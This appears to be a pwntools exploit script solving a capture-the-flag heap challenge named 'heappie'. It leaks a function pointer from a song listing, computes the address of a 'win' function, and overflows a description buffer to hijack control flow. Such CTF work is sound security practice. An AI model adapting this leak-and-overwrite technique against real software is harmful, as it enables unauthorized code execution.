from pwn import *

exe = ELF('./heappie')
context.binary = exe.path
# context.log_level = "DEBUG"

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    # io = remote("addr", 1337)
    io = remote("pwn.heroctf.fr", "6000")

print(hex(exe.symbols.win))
print(hex(exe.symbols.choose_random_play))
print(hex(exe.symbols.play_1))
print(hex(exe.symbols.play_2))
print(hex(exe.symbols.play_3))

io.sendlineafter(b'>>', b'1')
io.sendlineafter(b':', b'y')
io.sendlineafter(b':', b'title')
io.sendlineafter(b':', b'artist')
io.sendlineafter(b':', b'description')

# play_1 だと仮定してしまう
io.sendlineafter(b'>>', b'4')
io.recvuntil(b'song: ')
play_1 = int(io.recv(14), 16)
print(hex(play_1))
win = play_1 - exe.symbols.play_1 + exe.symbols.win
print(hex(win))

io.sendlineafter(b'>>', b'1')
io.sendlineafter(b':', b'y')
io.sendlineafter(b':', b'title')
io.sendlineafter(b':', b'artist')
io.sendlineafter(b':', pack(win) * 0x20)

io.sendlineafter(b'>>', b'1')
io.sendlineafter(b':', b'n')
io.sendlineafter(b':', b'title')
io.sendlineafter(b':', b'artist')
io.sendlineafter(b':', b'description')

io.sendlineafter(b'>>', b'4')

io.interactive()

# io.sendlineafter(b'>>', b'2')
# io.sendlineafter(b':', b'2')

# io.sendlineafter(b'>>', b'3')
# io.sendlineafter(b':', b'y')
# io.sendlineafter(b':', b'title')
# io.sendlineafter(b':', b'artist')
# io.sendlineafter(b':', b'A' * 0x1000)


# io.interactive()


    # b'\t1. title by artist (song: 0x55ca8f8232b3)\n'
    # b'\t2. title by artist (song: 0x55ca8f8232e9)\n'